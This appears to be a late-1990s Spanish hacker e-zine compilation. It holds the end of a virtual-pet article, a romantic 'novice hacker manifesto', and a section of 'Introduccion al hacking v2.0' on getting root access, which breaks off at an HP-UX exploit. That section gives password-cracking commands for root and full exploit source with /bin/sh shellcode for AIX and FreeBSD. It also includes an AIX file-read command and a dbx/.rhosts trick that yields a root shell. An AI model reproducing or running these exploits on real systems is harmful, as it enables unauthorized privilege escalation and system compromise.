  reseteas su reloj interno interno a 11:59 pm, hace que gane un a§o en
  minutos, asi que en poco tiempo, ya tenia 5 a§os :), despues de esto
  descubri que si le quitabas algun que otro minuto podrias alargarle la vida.
  "Borg5" murio con 35 a§os y 45 kilos. No iba a pesar mas, ademas que su
  medidor de salud empezo a bajar a toda velocidad, "Borg5" murio durmiendo.

        Una vez que mi hija se dio cuenta, rapidamente aprendio a manipular el
  reloj, es cuando empezoa probar con el "peque§o frankenstein". Darle de
  comer, suponia una bonificacion de 20 puntos, la disciplina tambien. De
  todas formas, alimentarlo solo sirve para que gane peso y este contento.
  Nunca "tienes" que jugar con el si esta contento, es decir que si su nivel
  de felicidad esta en cero se puede hacer que viva igual :), incluso tubimos
  uno que no lo alimentamos ningun dia (con disgusto de mi hija) y vivia igual
  de feliz :).

        Todos los ni§os del vecindario querian aprender como se hacia para
  manipular el reloj de la mascota para practicar en las suyas (perros,
  tortugas...), era muy facil decirselo y ademas la sonrisa que ponian cuando
  lo practicaban, les pude haber cobrado 5 duros a cada uno por decirselo.

        Ahora, lo que hay, mas que mascotas virtuales, son "mutantes
  virtuales", me siento como si hubiera liberado a cierto tipo de monstruo,
  porque que pasaria si estos ni§os empiezan a probar en animales de verdad?
  he abierto la puerta a algun tipo de veterinario o Dr. Jeckill?. 

        Que opinaria Mattell Corp. si se enteraran que he alterado su
  industria de Billones de dolares?, estan los "Men in Black" al otro lado de
  al puerta?. Realmente pienso que a los ni§os de hoy hay que cambiarles su
  forma de pensar, nada de eso de "ense§ame el triangulo azul" y esas cosas,
  de todas maneras, algun dia estos ni§os empezaran a usar ordenadores y a
  saber que haran..."

        Este articulo ha sido adaptado un poco al castellano para que se
  entienda mejor, espero que os haya gustado, jejejejeje, asi que nada mas y
  hasta otra :)

        Saludos a los grupos - J.J.F. / Hackers Team -, wakanda, ciberhack y a
  los canales de #hackers, #rejoin y especialmente a nobody, Fragel,
  Metalslug, Folixia, Meroka, ICEHOUSE y a todos aquellos de los que me
  olvido pero estan ahi :)

  Er Bisho (mama, mama, mama, mama, hay un bisho en mi cama)

  rolling_weables@hotmail.com

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

                       #################################
                       #       Manifiesto de un        #
                       #         hacker novato         #
                       #################################
                       #       by Silicon Dragon       #
                       #################################
                       #        Internet libre         #
                       #################################

------------------------------------------------------------------------------

        En la vida de todo hacker siempre existe un periodo, a veces largo,
  en el cual uno es un autentico novatillo para las cosas de internet. K
  nadie diga k no ha pasado un tiempo mas o menos largo en el cual el/ella a
  sido asi.

        Entrar en el mundo del Underground suele resultar dificil, no conoces
  a nadie y no sabes donde buscar informacion que te permita ampliar tus
  conocimientos sobre tecnicas y en fin todas esas cosilla que hacen de
  internet un mundo interesante y divertido. Los pasos que la mayoria de los
  actuales hackers (al menos los k yo conozco) suelen ser similares, a pesar
  de que entre ellos no se pareccan escepto por el hecho de gustarles nuestro
  mundo, y digo nuestro mundo porque internet es el mundo del hacker, donde
  nos relacionamos, pasamos buenos ratos, adquirimos conocimientos y hacemos
  nuevas amistades que nos permiten seguir adelante en el mundillo. Por otro
  lado vosotros/nosotros/ellos, los hackers, con mas o menos conocimientos,
  somos un grupo que vivimos aqui, en internet, y estamos acostumbrados a
  movernos por este mundo, aqui somos los reyes en la sombra, los maestros
  del bit, los luchadores por la libertad que luchan por sobrevivir ante un
  concepto mal creado de que somos "criminales sin escrupulos"; FALSO!!!,
  tenemos nuestra etica. Grandes compa§ias y grupos de intereses nos atacan e
  intentan aniquilarnos utilizando para ello arcaicas leyes y concepciones
  sobre el bien y el mal, pero ellos no se dan cuenta que nosotros, la tribu
  del ciberespacio, tenemos el poder en nuestras manos; o mas correctamente
  en nuestras mentes, libres y claras, nuestros dedos tecleando secuencias
  nunca so§adas por ellos, los guardianes de la moral publica y el estado de
  derecho; y nuestros ordenadores, maquinas con las que entramos en este
  fascinate mundo de internet, mundo de electrones corriendo por chips de
  silicio y aluminio, mundo de libertad y conocimiento. INTERNET.

        Todo aquel que llega o intenta llegar a ser un hacker, !A vivir en
  el maravilloso mundo de internet! Sabe que no tiene que seguir unas normas,
  pero comparte con el resto de la tribu un codigo por el que se rige y que
  lo diferencia de los lamers, que sin tener ni idea de nada se las dan de
  sabios perjudicandonos al resto y dando razones a ciertos sectores para
  criticarnos, ponernos como ejemplos de mal, lanzando sobre los menos
  protegidos sus perros de presa en forma de actuaciones judiciales, redadas
  y como no llevandonos a juicio por socavar la economia de tal o cual
  compa§ia a la que "nosotros" hemos perjudicado. !!!!Nosotros!!!! que
  nuestro afan no es enrriquezernos como ellos hacen. !Tienen miedo! de que
  les quitemos su maravilloso dinero, sus estructuras organizadas, su mundo
  gris y falto de libertad. !!!!Nosotros!!!! que nos guian un afan de
  superacion, de busqueda de conocimientos, !No para enrriquezernos! como
  hace nuestra sociedad decrepita sino para aumnetar nuestros conocimientos
  nuestra mente sin fronteras nuestra libertad. ≠≠≠≠Nosotros!!!! que buscamos
  la libertad, que defendemos causas justas, que no molestamos, da§amos,
  matamos..... ≠≠≠≠Nosotros!!!! esa tribu de malditos que nos temen por
  nuestro poder, por las ideas que afirmamos, por nuestra libertad. Nosotros
  los hackers.

        Pero volvamos al tema que nos ocupa en este articulo. Me acuerdo de
  cierto amigo de electrones, ®No adivinariais quien es?, al cual lo podemos
  llamar el dragoncito, je je je ya os lo imaginais quien ;) . Bueno pues ese
  amigo ,el dragoncito, era un chico, lo siento pero eso es innegable :)))) ,
  que a muy tierna edad y por los azares de la vida termino un verano delante
  de un ordenador, un 8086 o 80186, corria el a§o 85 (®®®hace tiempo eh???)
  y sin nada por hacer, con mucho tiempo libre y algo de curiosidad, bueno
  lo admito mucha :))). Bueno, ese chico aprendio lo que podria llamarse los
  fundamentos de la informatica y la programacion (el BASIC ®Vamos o creeis
  que empezo con ensamblador y binario?) el tiempo paso, mas o menos rapido, y
  hacia el a§o 1995-96 empezo lo que la mayoria de la gente llamaria inicio
  de una "carrera delictiva" o "fue por el mal camino" o "las malas compa§ias"
  o "le comieron la cabeza"...... vamos tonterias. Yo diria que inicio su
  vida en el fascinante mundo de internet donde todo es posible y se haya al
  alcance de nuestros programillas y nuestras mentes inquietas je je o
  vosotros que leeis esto no creeis en esta verdad.

        El hecho de tener una conexion a INTERNET es una ventaja que
  obviamente todos los que esteis leyendo esto teneis, a los demas les cobro
  derechos de autor :)))). Fue en ese momento, cuando el peque§o dragon
  optuvo la conexi¢n, cuando pudo continuar sus andanzas por el mundo de los
  ordenadores, los cuales havia abandonado, porque mira que los libros de
  informatica suelen ser aburridos de cojones uffffff, y ya que habia oido
  algo hacerca de esos "peligrosos criminales" llamados hackers :))))))), ®A
  que no sabeis que descubrio? "ostia si no son ni criminales, ni terroristas,
  ni locos, ni ladrones, son gente normal como yo!!!!" en fin la mascara con
  la que la sociedad nos cubre afecta a todos... Pues bien, el amigo
  dragoncito, como asi se llamaba ;) creo XDD, empezo a descubrir paginas en
  internet que le daban cierta informacion, truquillos, solo a nivel
  educativo :)) en fin lo que le encaminaria hacia las tinieblas( o en mi
  opinion hacia la luz, en INTERNET, es decir al dominio de la web, traspaso
  de ficheros, telnet, port spoofing, bugs de seguridad, passwords, root...)
  que le permitirian de una manera no da§ina y recalco esto no da§ina
  aprovechar todos los recursos que encontro en este mundo de electrones que
  corre a traves de lineas telefonicas, hondas herzianas y cables de fibra
  de vidrio a velocidades increibles, aumentando sus conocimientos hasta
  poder al fin, empezar a conocer este nuestro mundo donde todos somos
  maestros y alumnos, nadie sabe todo y de todos y en el que cualquiera
  (incluso los lamers) puede ense§ar algo (en el caso de los lamers lo que
  no debes hacer XDDDD)

        Una de las primeras cosas que el y todo aspirante a hacker suelen
  hacer es leer todo lo posible sobre este tema a lo largo de la red, como el
  hizo, es en el unico sitio donde se encontraria la verdad sobre tecnicas,
  estilos y codigos sobre nuestro/vuestro entretenimiento/trabajo/vida como
  hackers, como ser que se desplaza a traves de corrientes de datos sin que
  nadie pueda ni detectarlo ni pararlo, ni atacarle ni dominarlo. Lo mas
  dificil (pero al alcance de todos) fue encontrar la primera pagina web
  sobre este tema, ya que no suelen estar en la guia telefonica para que
  cualquiera llame y pregunte como ser un hacker (los lamers intentan algo
  asi XDDD) de ahi en adelante, pudo llegar a encontrar links (enlaces
  burros!!!) a otras paginas y asi entrar en  el entramado de los
  conocimientos que se guardan en INTERNET, el mundo de electrones
  representados por conjuntos de bits el cual con nuestra "magia" dominamos
  y con esta energia creamos un argamedon de poder y un nuevo mundo a nuestro
  antojo (que filosofico me pongo a veces :)))). 

        Otra de las cosas que le facilitaron el integrarse en la "tribu"
  fueron unos conocimientos minimos sobre programacion, :(( si se que los
  libros de programacion suelen ser aburridos, lentos y estupidos, pero hay
  k joderse y aprender algo ya que es fundamental para ser un hacker, si no
  conformate con ser un cracker (lo cual no es necesariamente malo), bajate
  alguno de sus ficheros y rompe todo por donde pases como hizo Atila con los
  Romanos (el rey de los Hunos, tribu aliada de Cartago peazo bestia no es un
  hacker famoso :))) pero piensa que: 1- Va en contra de nuestra etica, 2-
  Realmente cualquiera puede hacer eso, es realmente facil bajarse ficheros
  de internet; 3- Eso no es propio de un hacker sino de un cracker (no son
  peores pero tienen una concepcion diferente ).

        Y finalmente otra de las cosas que le ayudaron fueron conocer a unos
  amigos (hackers no iban a ser cocineros, con todo mis respetos a estos
  ultimos :))))) que le explicaron algunas cosillas y le ense§aron donde
  localizar otras, la verdad es que el dragoncito es el amigo que todos
  quieren, le gustaba y le gusta aprender y suele ser simpatico (Lo siento
  pero su abuela no esta aqui para echarle flores  :))). Por otro lado, el
  IRC fue y es un buen sitio donde pedir ayuda, no siempre (o casi nunca lo
  reconozco) le contestaron (en cuanto le conocieron si, es que hay mucho
  IRC-COP ) pero de vez en cuando si. De paso saludos para los del canal
  #hackers del IRC-hispano (donde normalmente se habla de todo menos de la
  tematica del hacker, aunque te lo pasas bien je je je y a veces te ayudan,
  lo digo por esperiencia son buena gente, lo malo es cuando se aburren y les
  da por nukear a alguien ;) ). Pero bueno sigamos con la jodia historia.....

        El hecho de aprender y buscar ayuda, es si no el unico, si el mejor
  camino para adentrarse en este mundo. La ayuda siempre viene bien porque me
  acuerdo de lo que le paso en su primer telnet, llamando a un numero
  aleatorio que se le ocurrio termino dando con un ordenata que cada vez que
  le preguntaba algo le daba su direccion de ip (la del dragocillo) o otra
  vez que mando un e-mail falso a un amigo y resulta que el servidor al que
  se habia conectado escribio el nombre "supuesto" el remitente a
  continuacion del real (a tomar por culo el anonimato) todo ello le paso por
  no consultar a los que si que sabian eso lo nuestro es una busqueda de
  informacion y que mejor forma de distribuirla que compartirla entre
  nosotros que somos los mas interesados en que la informacion y la libertad
  se mantenga en INTERNET.

        La libertad de los hackers es fundamental para el mantenimiento de la
  libertad en INTERNET. No solo entre la cultura underground sino de todos
  los usuarios que utilizan este medio. Esta es la razon por lo que el
  peque§o dragoncito se metio en este mundillo, por la que los hackers siguen
  luchando a pesar de que constantemente se les fustiga desde todos los
  angulos de la sociedad. El nuestro es un trabajo vital y a mi/nosotros
  me/nos gusta nuestra libertad que no cambiaria por nada. En el camino para
  convertirse en hackers muchos pierden el rumbo, quizas es un camino dificil,
  pero merece la pena. No ir por falsos atajos se llega antes al final. Como
  dijo un famoso poeta Espa§ol "Caminante no hay camino, el camino se hace al
  andar". (Soy un chico culto ;) ). No somos hackers por tener los
  conocimientos lo somos al investigar; al buscar nuevos conocimientos,
  cuando ayudamos al nuevo a conocer el mundo, a buscar conocimientos, a
  escapar del mal, a respetar el codigo; al ampliar la libertad en INTERNET
  al luchar por ella contra los que intentan socavarla; al caminar; AL
  HACKEAR. Hemos nacido para ello somos los paladines de una causa justa,
  nadie debe cuartar nuestras libertades somos los dragones del amanecer de
  una nueva epoca, nos pueden llamar malvados pero el tiempo demostrara que
  hemos sido los cruzados de la causa de la libertad en INTERNET, vigilaremos
  a los poderes y no les dejaremos actuar contra nuestra libertad contra
  nosotros, al fin y al cabo, sabemos quienes somos y que queremos,la buskeda
  del conocimiento no sera parada asi que amigos, veteranos y novatos no os
  rindais a pesar de los surquemos los espacios virtuales, navegemos por
  los mares del conocimiento utilizemos nuestras garras de electrones
  nuestros cerebros de aluminio y silicio, y hagamos aquello que nos da la
  libertad y para lo que hemos nacido: SOMOS HACKERS Y AQUI ESTAMOS.... y que
  lo sepan nuestros enemigos saldremos victoriosos de las batallas, el futuro
  los odiara y nos aclamara por nuestra libertad entre bites y silicio.

------------------------------------------------------------------------------

        Devo dar las gracias a mucha gente que me ha ayudado a entrar en este
  fascinante mundo, ups, digo ayudaron al dragoncito a entrar ;), algunos de
  una forma activa como Bisho al cual le, otro ups el dragoncito, le debe
  mucho. Otros escribiendo articulos o manteniendo paginas donde localizar
  los conocimientos oscuros (je je je me he rayao) como: J.J.F./ Hackers Team,
  Wakanda, Van Hackez, Sakeadores........ y muchos otros que si los pusiera
  en este articulo ocuparian Mb enteros y para los que brindo mi mayor apollo
  ya que sin ellos nuestro mundo no seia el mismo INTERNET no seria el mundo
  de libertad que es y nosotros, la trivu, no  tendriamos  donde habitar
  oscurecidos por los poderes malignos (ahora si que me he rayao) que
  intentan doblegarnos AUNQUE NUNKA LO LOGRARAN porque soy un hacker
  (novato eso si) y mi trivu me protegera y me ayudara a defenderme,
  tenemos el poder y sabemos como usarlo para conservar nuestra/vuestra
  libertad, SOMOS HACKERS, SOMOS LIBRES. 

------------------------------------------------------------------------------

                                                  by Silicon Dragon
                                          e-mail dragonsilicio@bigfoot.com

------------------------------------------------------------------------------

        La distrivucion de este texto es completamente libre salvo que sea
  usado por fuerzas de seguridad (en cuyo caso deberan de pagar por su uso
  una cantidad no inferior a $1,000,000.00) o para su uso en cualquier tipo
  de juicios y ese tipo de cosas (si no lo tienes claro preguntame XDDD) en
  cuyo caso los derechos del autor (yo) son los mismos que en el caso de la
  policia (a pagar chatos). Para los demas con meros fines educativos y tal
  es gratis :))).

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

                      ⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
                      € INTRODUCCION AL HACKING v2.0 €
                      ¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ

  POR DAEMON 25-01-1998
  Daemond@usa.net
  Dillet@usa.net

  7.- CONSEGUIR ACCESO DE ROOT

        En esta seccion voy a explicar tres metodos para conseguir root
  aunque hay algunos mas que quiza adjunte en posteriores ediciones. Los que
  voy a explicar aqui son la fuerza bruta, los xploits para pillar root y
  troyanos.

  7.1.- FUERZA BRUTA

        En fin, se puede intentar sacar el password del root a partir del
  fichero /etc/passwd pero sinceramente es muy dificil ke el root sea tan
  tordo de tener un password sencillo aunque funciona aproximadamente un 5%
  de los casos que algo es algo (mi experiencia es ke kada 10-15 makinas sako
  un password de root kon fuerza bruta usando solo los diccionarios usuales).

        Si no tienes mas recursos para pillar el root, puedes probar a sacar
  el passwd de root usando el modo incremental en cualquier crackeador. En el
  caso del john the ripper, la sintaxis seria john -i -rules -users:0
  ficheropasswd.

        He de avisar que el metodo incrementar es una locura, de hecho hay
  textos por ahi diciendo que tardaria a§os en sacar el passwd. Yo solo he
  probado una vez este metodo para ver que tal iba y me saco el passwd tras
  unas 70 horas, pero tras hablar con gente por ahi.. creo que tuve suerte.,
  es decir que de aqui se deduce que no vale la pena.. porque tener la
  maquina en marcha alomejor 100 horas o las que sean es una chorrada cuando
  se puede rular algun xploit y pillar el root en 5 minutos :-)

        De todos modos, una manera de trabajar seria no dedicar especial
  atencion al modo incremental, pero tras sacar algunas cuentas de usuarios
  normales, pasar algunos diccionarios con la opcion:

  John -wordfile:dict.txt -rules -users:0 passwd

        Y si rula, rula que tampoco se pierde tanto tiempo en pasar un par de 
  diccionarios :o)

        Pero en fin, en general el metodo mas rapido es usar un xploit como
  se comentara a continuacion aunque puede haber casos en los que el sistema 
  operativo en el que estais no encontreis xploits (sistemas operativos raros)
  o que estos xploits no funcionen por lo que estando muy desesperados podeis 
  hacerlo asi aunque en el caso de que los xploits no funcionen es ke 
  posiblemente el root kontrole y no creo que tenga un passwd sencillo, pero
  en fin.. nunka se sabe :)

  7.2.- XPLOITS

        En esta seccion voy a intentar poner uno de cada sistema operativo de
  los que suele haber por ahi y ademas voy a intentar que sean nuevecillos ..
  pero como siempre se pueden buscar en la red (siempre tengo el correo
  abierto para mails diciendome ftp buenos jeje).

        Para entender el funcionamiento de la mayoria de ellos, los famosos
  buffer overflow, puedes leer algunos articulillos que hay en la red de
  Aleph One o Mudge por poner algunos ejemplos.. opino que valen la pena ;o)

        Bueno.. aqui va el rollo de xploits (pongo uno de cada pero aconsejo
  que tengais por lo menos 10 de cada sistema operativo porque luego puede
  pasar que no tengas uno de una version determinada, que no rule, etc. Ademas 
  aconsejo que los ordeneis por sistemas operativos en directorios separados y 
  si eres muy currante los puedes ordenar hasta por versiones del sistema 
  operativo, pero eso ya es solo para gente ordenada jeje):

        No los pongo traducidos ya que creo que es una currada que no sirve
  para nada porque son de facil lectura. Ahi van:

  AIX

------------ Codigo Fuente ---------------------------------------------------

/* Under AIX 4.2 (probably others) /usr/dt/bin/dtaction does not handle
properly the HOME environment variable and that spawns a root shell. A lot
of other X programs have the same problem and /bin/X11/xlock is well known
to be exploitable.
Tested on AIX 4.2 box.

SOLUTION: #chmod -s /usr/dt/bin/dtaction /bin/X11/xlock
 OR apply patches */

/*
 AIX 4.2,(others?) dtaction and HOME exploit by Georgi Guninski

----------------------------------------
DISCLAIMER

This program is for educational purpose ONLY. Do not use it without
permission.
 The usual standard disclaimer applies, especially the fact that Georgi
Guninski
 is not liable for any damages caused by direct or  indirect use of
 the information or functionality provided by this program.
 Georgi Guninski, his employer or any Internet provider bears NO
responsibility for content
 or misuse of this program or any derivatives thereof.
 By using this program you accept the fact that any damage (dataloss,
system
 crash, system compromise, etc.) caused by the use of this program is not
 Georgi Guninski's responsibility.

In case you distribute this, please keep the disclaimer and my addresses.
-----------------------------------------
Use the IBM C compiler.
Compile with: cc -g aixdtaction.c
DISPLAY should be set.
SOLUTION: #chmod -s /usr/dt/bin/dtaction         ; at least stops root shells
-----------------
Georgi Guninski
 guninski@hotmail.com
 http://www.geocities.com/ResearchTriangle/1711

Suggestions,comments and job offers are welcome!
10-JUNE-97
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


char *prog="/usr/dt/bin/dtaction";
char *prog2="dtaction";
extern int execv();

char *createvar(char *name,char *value)
{
char *c;
int l;
l=strlen(name)+strlen(value)+4;
if (! (c=malloc(l))) {perror("error allocating");exit(2);};
strcpy(c,name);
strcat(c,"=");
strcat(c,value);
return c;
}

/*The program*/
main(int argc,char **argv,char **env)
{
/*The code*/
unsigned int code[]={
0x7c0802a6 , 0x9421fbb0 , 0x90010458 , 0x3c60f019 ,
0x60632c48 , 0x90610440 , 0x3c60d002 , 0x60634c0c ,
0x90610444 , 0x3c602f62 , 0x6063696e , 0x90610438 ,
0x3c602f73 , 0x60636801 , 0x3863ffff , 0x9061043c ,
0x30610438 , 0x7c842278 , 0x80410440 , 0x80010444 ,
0x7c0903a6 , 0x4e800420, 0x0
};
/* disassembly
7c0802a6        mfspr   r0,LR
9421fbb0        stu     SP,-1104(SP) --get stack
90010458        st      r0,1112(SP)
3c60f019        cau     r3,r0,0xf019
60632c48        lis     r3,r3,11336
90610440        st      r3,1088(SP)
3c60d002        cau     r3,r0,0xd002
60634c0c        lis     r3,r3,19468
90610444        st      r3,1092(SP)
3c602f62        cau     r3,r0,0x2f62 --'/bin/sh\x01'
6063696e        lis     r3,r3,26990
90610438        st      r3,1080(SP)
3c602f73        cau     r3,r0,0x2f73
60636801        lis     r3,r3,26625
3863ffff        addi    r3,r3,-1
9061043c        st      r3,1084(SP) --terminate with 0
30610438        lis     r3,SP,1080
7c842278        xor     r4,r4,r4    --argv=NULL
80410440        lwz     RTOC,1088(SP)
80010444        lwz     r0,1092(SP) --jump
7c0903a6        mtspr   CTR,r0
4e800420        bctr              --jump
*/

#define MAXBUF 600
unsigned int buf[MAXBUF];
unsigned int frame[MAXBUF];
unsigned int i,nop,mn=100;
int max=280;
unsigned int toc;
unsigned int eco;
unsigned int *pt;
char *t;
unsigned int reta; /* return address */
int corr=3400;
char *args[4];
char *newenv[8];


if (argc>1)
        corr = atoi(argv[1]);

pt=(unsigned *) &execv;
toc=*(pt+1);
eco=*pt;

if ( ((mn+strlen((char*)&code)/4)>max) || (max>MAXBUF) )
{
        perror("Bad parameters");
        exit(1);
}

#define OO 7
*((unsigned short *)code + OO + 2)=(unsigned short) (toc & 0x0000ffff);
*((unsigned short *)code + OO)=(unsigned short) ((toc >> 16) & 0x0000ffff);
*((unsigned short *)code + OO + 8 )=(unsigned short) (eco & 0x0000ffff);
*((unsigned short *)code + OO + 6 )=(unsigned short) ((eco >> 16) &
0x0000ffff);

reta=(unsigned) &buf[0]+corr;

for(nop=0;nop<mn;nop++)
 buf[nop]=0x4ffffb82;
strcpy((char*)&buf[nop],(char*)&code);
i=nop+strlen( (char*) &code)/4-1;

if( !(reta & 0xff) || !(reta && 0xff00) || !(reta && 0xff0000)
        || !(reta && 0xff000000))
{
perror("Return address has zero");exit(5);
}

while(i++<max)
 buf[i]=reta;
buf[i]=0;

for(i=0;i<max-1;i++)
 frame[i]=reta;
frame[i]=0;

/* 4 vars 'cause the correct one should be aligned at 4bytes boundary */
newenv[0]=createvar("EGGSHEL",(char*)&buf[0]);
newenv[1]=createvar("EGGSHE2",(char*)&buf[0]);
newenv[2]=createvar("EGGSHE3",(char*)&buf[0]);
newenv[3]=createvar("EGGSHE4",(char*)&buf[0]);
newenv[4]=createvar("DISPLAY",getenv("DISPLAY"));
newenv[5]=createvar("HOME",(char*)&frame[0]);
newenv[6]=NULL;

args[0]=prog2;
puts("Start...");/*Here we go*/
execve(prog,args,newenv);
perror("Error executing execve \n");
/*      Georgi Guninski guninski@hotmail.com
        http://www.geocities.com/ResearchTriangle/1711*/
}

/*
-brute-script----------------------------------------------------------
#!/bin/ksh
L=200
O=40
while [ $L -lt 12000 ]
do
echo $L
L=`expr $L + 96`
./a.out $L
done
*/

------------ FIN -------------------------------------------------------------

  OTRO PARA AIX

------------ Codigo Fuente ---------------------------------------------------

        Existe una vulnerabilidad en el comando lquerypv de AIX. no estoy
  seguro de la version.

  /usr/sbin/lquerypv -h /etc/security/passwd

        Puedes sustituir /etc/security/passwd por cualquier otro fichero que
  no podamos leer (que no tengamos permiso de lectura por no ser r00t).

------------ FIN -------------------------------------------------------------

  FREEBSD

------------ Codigo Fuente ---------------------------------------------------

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define DEFAULT_OFFSET		50
#define BUFFER_SIZE		256

long get_esp(void)
{
   __asm__("movl %esp,%eax\n");
}

main(int argc, char **argv)
{
   char *buff = NULL;
   unsigned long *addr_ptr = NULL;
   char *ptr = NULL;

/* so you dont have to disassemble it, here is the asm code:
start:
jmp     endofk0dez
realstart:
popl    %esi
leal    (%esi), %ebx
movl    %ebx, 0x0b(%esi)
xorl    %edx, %edx
movl    %edx, 7(%esi)
movl    %edx, 0x0f(%esi)
movl    %edx, 0x14(%esi)
movb    %edx, 0x19(%esi)
xorl    %eax, %eax
movb    $59, %al
leal    0x0b(%esi), %ecx
movl    %ecx, %edx
pushl   %edx
pushl   %ecx
pushl   %ebx
pushl   %eax
jmp     bewm
endofk0dez:
call    realstart
.byte   '/', 'b', 'i', 'n', '/', 's', 'h'
.byte   1, 1, 1, 1
.byte   2, 2, 2, 2
.byte   3, 3, 3, 3
bewm:
.byte   0x9a, 4, 4, 4, 4, 7, 4
*/
   
   char execshell[] =
   "\xeb\x23"
   "\x5e"
   "\x8d\x1e"
   "\x89\x5e\x0b"
   "\x31\xd2"
   "\x89\x56\x07"
   "\x89\x56\x0f"
   "\x89\x56\x14"
   "\x88\x56\x19"
   "\x31\xc0"
   "\xb0\x3b"
   "\x8d\x4e\x0b"
   "\x89\xca"
   "\x52"
   "\x51"
   "\x53"
   "\x50"
   "\xeb\x18"
   "\xe8\xd8\xff\xff\xff"
   "/bin/sh"
   "\x01\x01\x01\x01"
   "\x02\x02\x02\x02"
   "\x03\x03\x03\x03"
   "\x9a\x04\x04\x04\x04\x07\x04";
   
   int i;
   int ofs = DEFAULT_OFFSET;

   /* if we have a argument, use it as offset, else use default */
   if(argc == 2)
      ofs = atoi(argv[1]);   
   /* print the offset in use */
   printf("Using offset of esp + %d (%x)\n", ofs, get_esp()+ofs);
   
   buff = malloc(4096);
   if(!buff)
   {
      printf("can't allocate memory\n");
      exit(0);
   }
   ptr = buff;
   /* fill start of buffer with nops */
   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
   ptr += BUFFER_SIZE-strlen(execshell);
   /* stick asm code into the buffer */
   for(i=0;i < strlen(execshell);i++) 
      *(ptr++) = execshell[i];
   /* write the return addresses
   **
   ** return address				4
   ** ebp					4
   ** register unsigned n			0
   ** register char *cp				0
   ** register struct syment *s			0
   **
   ** total: 8
   */
   addr_ptr = (long *)ptr;
   for(i=0;i < (8/4);i++)
      *(addr_ptr++) = get_esp() + ofs;
   ptr = (char *)addr_ptr;
   *ptr = 0;
   execl("/usr/bin/rdist", "rdist", "-d", buff, "-d", buff, NULL);
}

------------ FIN -------------------------------------------------------------

  FREEBSD

------------ Codigo Fuente ---------------------------------------------------

There is a BSD exploit that works on the termcap file. it has some entries
like this.

 telnet> env def TERM access
 telnet> env def TERMCAP /path/and/name/of/uploaded/file
 telnet> open victim.host.com

and the source code is here:
--------SNIP-----

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define filename "./termcap"
#define entry   "access|Gimme r00t:\\\n :"
#define bufsize 1300
#define default_offset 870    /* Should work...*/

char shellcode[] =
   "\xeb\x35\x5e\x59\x33\xc0\x89\x46\xf5\x83\xc8\x07\x66\x89\x46\xf9"
   "\x8d\x1e\x89\x5e\x0b\x33\xd2\x52\x89\x56\x07\x89\x56\x0f\x8d\x46"
   "\x0b\x50\x8d\x06\x50\xb8\x7b\x56\x34\x12\x35\x40\x56\x34\x12\x51"
   "\x9a\x3e\x39\x29\x28\x39\x3c\xe8\xc6\xff\xff\xff/bin/sh";

long get_sp(void)
{
   __asm__("movl %esp, %eax\n");
}

int main(int argc, char *argv[]) {
   int i, fd, offs;
   long *bof_ptr;
   char *ptr, *buffer, *tempbuf;

   offs = default_offset;

   if(argc == 2) {
      printf("using offset: %d\n",atoi(argv[1]));
      offs = atoi(argv[1]);
   }

   if(!(buffer = malloc(bufsize))) {
      printf("can't allocate enough memory\n");
      exit(0);
   }


  if(!(tempbuf = malloc(bufsize+strlen(entry) + 50))) {
      printf("can't allocate enough memory\n");
      exit(0);
   }

   bof_ptr = (long *)buffer;
   for (i = 0; i < bufsize - 4; i += 4)
      *(bof_ptr++) = get_sp() - offs;

   ptr = (char *)buffer;
   for (i = 0; i < ((bufsize-strlen(shellcode)))/2 - 1; i++)
      *(ptr++) = 0x90;

   for (i = 0; i < strlen(shellcode); i++)
      *(ptr++) = shellcode[i];

   printf("Creating termcap file\n");

   snprintf(tempbuf, (bufsize+strlen(entry)+50), "%s%s:\n", entry,
buffer);
   fd = open(filename, O_WRONLY|O_CREAT, 0666);
   write (fd, tempbuf, strlen(tempbuf));
   close(fd);
}

------------ FIN -------------------------------------------------------------

  DIGITAL CON DBX

------------ Codigo Fuente ---------------------------------------------------

If you run dbx (tested on 3.11.10) on a setuid root program that you have read
access to, the program will core dump and create a root owned 600 perm core 
in the current directory. You might have to run dbx one or two times to get it
to work.. The message you are looking for is:

dbx version 3.11.10
Type 'help' for help.

warning: /bin/crontab has no symbol table -- very little is supported
without it

Could not attach to process 10112

cannot run program
Exiting due to error during startup

Now, this core dump will follow symlinks.. and using the trick mentioned
earlier with embedding + + in a core dump, you can easily grab root.

ln -s /.rhosts core
BOB42="

+ +

"
export BOB42
dbx /bin/crontab
rsh -l root localhost /bin/sh -i

------------ FIN -------------------------------------------------------------

  HP-UX

------------ Codigo Fuente ---------------------------------------------------

/***
 *
 * HP-UX /usr/etc/vhe/vhe_u_mnt bug exploit.
 *
 * This bug is exhibited in all versions of HP-UX that contain
